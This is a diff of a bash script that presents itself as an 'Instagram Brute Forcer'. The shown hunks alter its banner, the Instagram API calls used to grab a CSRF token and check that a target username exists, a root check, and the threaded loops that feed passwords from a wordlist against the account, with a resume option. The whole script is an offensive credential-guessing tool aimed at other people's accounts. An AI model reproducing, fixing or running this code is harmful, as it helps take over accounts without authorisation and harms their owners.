@@ -1,7 +1,6 @@
 #!/bin/bash
 # Coded by: github.com/thelinuxchoice
-# Instagram: @linux_choice
-# Re uloaded by @F33Z due to auther removed source
+# Instagram: @thelinuxchoice
 
 trap 'store;exit 1' 2
 string4=$(openssl rand -hex 32 | cut -c 1-4)
@@ -13,7 +12,7 @@ uuid=$(openssl rand -hex 32 | cut -c 1-32)
 phone="$string8-$string4-$string4-$string4-$string12"
 guid="$string8-$string4-$string4-$string4-$string12"
 var=$(curl -i -s -H "$header" https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid > /dev/null)
-var2=$(echo $var | grep -o 'csrftoken=.*' | cut -d ';' -f1 | cut -d '=' -f2)
+var2=$(echo $var | awk -F ';' '{print $2}' | cut -d '=' -f3)
 
 checkroot() {
 if [[ "$(id -u)" -ne 0 ]]; then
@@ -51,17 +50,16 @@ printf "\e[1;92m ) )| ||  _ \  /___)(_   _)(____ | /___)|  _ \ | ___ || || |    
 printf "\e[1;77m(_/ | || | | ||___ |  | |_ / ___ ||___ || | | || ____|| || |  _____   \e[0m\n"
 printf "\e[1;77m    |_||_| |_|(___/    \__)\_____|(___/ |_| |_||_____) \_)\_)(_____)  \e[0m\n"
 printf "\n"
-printf "\e[1;77m\e[45m  Instagram Brute Forcer v1.5.5 Author: @linux_choice (Github/IG)   \e[0m\n"
-printf ""
-printf "\n"\e[1;77m\e[45m visit https://medium.com/@itmefeez for tutorial \e[0m\n"
+printf "\e[1;77m\e[45m  Instagram Brute Forcer v1.5.4 Author: thelinuxchoice (Github/IG)   \e[0m\n"
+printf "\n"
 }
 
 function start() {
 banner
-#checkroot
+checkroot
 dependencies
 read -p $'\e[1;92mUsername account: \e[0m' user
-checkaccount=$(curl -L -s https://www.instagram.com/$user/ | grep -c "the page may have been removed")
+checkaccount=$(curl -s https://www.instagram.com/$user/?__a=1 | grep -c "the page may have been removed")
 if [[ "$checkaccount" == 1 ]]; then
 printf "\e[1;91mInvalid Username! Try again\e[0m\n"
 sleep 1
@@ -135,7 +133,7 @@ printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
 token=0
 startline=1
 endline="$threads"
-while [[ "$token" -lt "$count_pass" ]]; do
+while [ $token -lt $count_pass ]; do
 IFS=$'\n'
 for pass in $(sed -n ''$startline','$endline'p' $wl_pass); do
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
@@ -190,7 +188,7 @@ printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
 
 count_pass=$(wc -l $wl_pass | cut -d " " -f1)
 
-while [[ "$token" -lt "$count_pass" ]]; do
+while [ $token -lt $count_pass ]; do
 IFS=$'\n'
 for pass in $(sed -n '/\b'$pass'\b/,'$(($token+threads))'p' $wl_pass); do
 #for pass in $(sed -n '/\b'$pass'\b/,'$threads'p' $wl_pass); do
@@ -215,4 +213,3 @@ case "$1" in --resume) resume ;; *)
 start
 bruteforcer
 esac
-
